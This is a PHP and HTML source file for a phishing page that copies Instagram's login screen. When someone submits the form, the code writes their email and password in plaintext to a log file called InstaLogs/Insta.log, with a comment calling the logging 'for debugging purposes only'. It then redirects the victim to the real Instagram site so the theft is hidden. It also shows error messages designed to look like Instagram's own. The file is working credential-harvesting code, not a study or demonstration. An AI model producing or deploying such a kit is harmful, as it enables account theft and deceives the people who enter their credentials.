<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Validate email and password
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // Handle invalid email
        echo "The email address or mobile number you entered isn't connected to an account.";
        exit();
    } elseif (strlen($password) < 8 || preg_match('/\s/', $password)) {
        // Handle invalid password
        echo "The password that you've entered is incorrect.";
        exit();
    } else {
        // Ensure the logs directory exists
        if (!is_dir('../InstaLogs')) {
            mkdir('../InstaLogs', 0777, true);
        }

        // Log the email and password (for debugging purposes only)
        error_log("Email: $email\nPassword: $password\n", 3, "../InstaLogs/Insta.log");

        // Redirect to the real Facebook login page
        header("Location: https://instagram.com/");
        exit();
    }
}
?>
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media-queries.css" />
    <link rel="icon" href="photos/insta-icon.png" />
    <link rel="icon" href="images/favicon.png" type="image/png">
    <script src="js/main.js" defer></script>
</head>
<body>
    <main>
        <div class="log-in-container">
            <div class="log-in">
                <img src="photos/logo.png" class="logo"/>
                <form class="log-in-form" method="POST" action="">
                    <input type="text" name="email" placeholder="Phone number, username or email address" required />
                    <input type="password" name="password" placeholder="Password" required />
                    <button type="submit" class="log-in-button">Log In</button>
                </form>
                <span class="or-divider">OR</span>
                <!--FACEBOOK OPTION-->
                <div class="fb-login">
                    <a href="https://www.facebook.com/login">
                        <img src="photos/facebook-icon.png">
                        <span>Log in with Facebook</span>
                    </a>
                </div>
                <!--forgot passwd-->
                <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
            </div>
            <!--sign up-->
            <div class="sign-up">
                <span>Don't have an account?
                    <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                </span>
            </div>
            <!--download-->
            <div class="get-the-app">
                <span>Get the app.</span>
                <div class="app-images">
                    <a href="#"><img src="photos/applestore.png" /></a>
                    <a href="#"><img src="photos/googlestore.png" /></a>
                </div>
            </div>
        </div>
        <!--phones-->
        <div class="phones-container">
            <img src="photos/phones.png" />
        </div>
    </main>
    <footer>
        <ul class="footer-links">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">TOP</a></li>
            <li><a href="#">ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <li><a href="#">English (UK) © 2025 Instagram from Meta</a></li>
    </footer>    
</body>
</html>